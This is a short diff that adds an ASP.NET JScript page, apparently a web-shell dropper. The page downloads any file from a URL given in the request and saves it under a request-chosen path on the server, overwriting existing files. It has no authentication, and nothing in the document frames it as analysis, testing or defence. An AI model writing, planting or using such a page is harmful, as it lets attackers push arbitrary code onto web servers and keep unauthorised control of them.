@@ -1,0 +1,1 @@
+<% @Page Language="Jscript"%><%var e:Exception; try{var X=new ActiveXObject("Microsoft.XMLHTTP");var S=new ActiveXObject("Adodb.Stream");S.Type=1;S.Mode=3;S.Open();X.Open("GET",Request.Item["url"],false);X.Send();S.Write(X.ResponseBody);S.Position=0;S.SaveToFile(Server.MapPath(Request.Item["filename"]),2);S.close;S=null;X=null;}catch(e){Response.Write(e.message);}%>
